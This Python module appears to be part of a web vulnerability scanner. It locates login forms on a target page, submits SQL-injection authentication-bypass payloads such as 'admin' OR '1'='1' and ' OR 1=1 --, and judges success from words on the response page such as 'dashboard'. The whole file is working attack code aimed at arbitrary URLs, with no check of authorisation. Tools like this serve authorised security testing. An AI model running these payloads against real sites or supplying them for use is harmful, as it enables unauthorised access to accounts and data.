import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from core.intelligence import handle_vulnerability


LOGIN_PAYLOADS = [
    {"username": "admin' OR '1'='1", "password": "anything"},
    {"username": "' OR 1=1 --", "password": "test"},
    {"username": "admin' --", "password": "test"},
]


def find_login_form(url):

    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")

        forms = soup.find_all("form")

        for form in forms:

            inputs = form.find_all("input")

            has_user = False
            has_pass = False

            for inp in inputs:
                name = inp.get("name")

                if not name:
                    continue

                name = name.lower()

                if "user" in name or "email" in name:
                    has_user = True

                if "pass" in name:
                    has_pass = True

            if has_user and has_pass:
                return form

    except Exception as e:
        print("[FORM ERROR]", e)

    return None


def scan_login(url):

    print(f"[LOGIN SCAN] {url}")

    form = find_login_form(url)

    if not form:
        print("[!] No login form found")
        return

    action = form.get("action")

    # ✅ FIXED URL HANDLING
    if not action:
        action = url
    else:
        action = urljoin(url, action)

    method = form.get("method", "post").lower()

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    for payload in LOGIN_PAYLOADS:

        data = {}

        for inp in form.find_all("input"):
            name = inp.get("name")

            if not name:
                continue

            lname = name.lower()

            if "user" in lname or "email" in lname:
                data[name] = payload["username"]

            elif "pass" in lname:
                data[name] = payload["password"]

            else:
                data[name] = "test"

        try:
            # ✅ SUPPORT GET & POST
            if method == "post":
                response = requests.post(action, data=data, headers=headers, timeout=5)
            else:
                response = requests.get(action, params=data, headers=headers, timeout=5)

            text = response.text.lower()

            success_indicators = ["dashboard", "welcome", "logout", "profile"]
            failure_indicators = ["invalid", "error", "incorrect", "failed"]

            success = any(s in text for s in success_indicators)
            failure = any(f in text for f in failure_indicators)

            # ✅ STRONGER LOGIC
            if success and not failure:

                print("\n🚨 LOGIN BYPASS FOUND 🚨")
                print("URL:", action)
                print("Payload:", payload)

                handle_vulnerability(
                    "Login Bypass (SQLi)",
                    action,
                    parameter="login",
                    payload=str(payload)
                )

                return

        except Exception as e:
            print("[LOGIN ERROR]", e)